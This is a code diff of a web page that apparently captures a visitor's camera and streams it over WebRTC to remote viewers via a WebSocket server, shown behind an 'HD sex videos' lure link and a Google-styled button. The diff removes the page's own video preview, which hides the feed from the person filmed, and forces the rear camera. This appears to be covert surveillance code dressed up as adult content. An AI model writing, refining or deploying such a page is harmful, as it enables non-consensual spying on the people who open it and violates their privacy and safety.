@@ -9,16 +9,9 @@
       margin: 0;
       background: #111;
       color: #fff;
-      font-family: Arial;
+      font-family: Arial, sans-serif;
       text-align: center;
       padding: 20px;
-    }
-
-    video {
-      width: 95%;
-      max-width: 900px;
-      background: #000;
-      border-radius: 10px;
     }
 
     #status {
@@ -29,11 +22,12 @@
     #id {
       font-size: 13px;
       color: #aaa;
+      margin-bottom: 15px;
     }
 
     .google-button {
       display: inline-block;
-      margin: 10px 0 18px;
+      margin: 0 0 18px;
       padding: 12px 22px;
       background: #fff;
       color: #000;
@@ -66,11 +60,8 @@
     HD sex videos
   </a>
 
-  <video id="video" autoplay muted playsinline></video>
-
   <script>
     const status = document.getElementById("status");
-    const video = document.getElementById("video");
     const idBox = document.getElementById("id");
 
     const ws = new WebSocket(
@@ -101,13 +92,11 @@
 
       pc.onicecandidate = e => {
         if (e.candidate) {
-          ws.send(
-            JSON.stringify({
-              type: "candidate",
-              candidate: e.candidate,
-              toViewerId: viewerId
-            })
-          );
+          ws.send(JSON.stringify({
+            type: "candidate",
+            candidate: e.candidate,
+            toViewerId: viewerId
+          }));
         }
       };
 
@@ -128,26 +117,25 @@
           "Camera ID: " + cameraId;
 
         try {
-          stream =
-            await navigator.mediaDevices.getUserMedia({
-              video: true,
-              audio: false
-            });
-
-          video.srcObject = stream;
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: {
+                exact: "environment"
+              }
+            },
+            audio: false
+          });
 
           status.textContent =
             "🟢 Camera is LIVE";
 
-          ws.send(
-            JSON.stringify({
-              type: "camera-live"
-            })
-          );
+          ws.send(JSON.stringify({
+            type: "camera-live"
+          }));
 
         } catch (err) {
           status.textContent =
-            "❌ Camera permission denied";
+            "❌ Back camera permission denied";
         }
       }
 
@@ -156,23 +144,19 @@
 
         const pc = createPeer(m.viewerId);
 
-        const offer =
-          await pc.createOffer();
+        const offer = await pc.createOffer();
 
         await pc.setLocalDescription(offer);
 
-        ws.send(
-          JSON.stringify({
-            type: "offer",
-            offer: pc.localDescription,
-            toViewerId: m.viewerId
-          })
-        );
+        ws.send(JSON.stringify({
+          type: "offer",
+          offer: pc.localDescription,
+          toViewerId: m.viewerId
+        }));
       }
 
       if (m.type === "answer") {
-        const pc =
-          peers.get(m.toViewerId);
+        const pc = peers.get(m.toViewerId);
 
         if (pc) {
           await pc.setRemoteDescription(
@@ -182,8 +166,7 @@
       }
 
       if (m.type === "candidate") {
-        const pc =
-          peers.get(m.toViewerId);
+        const pc = peers.get(m.toViewerId);
 
         if (
           pc &&
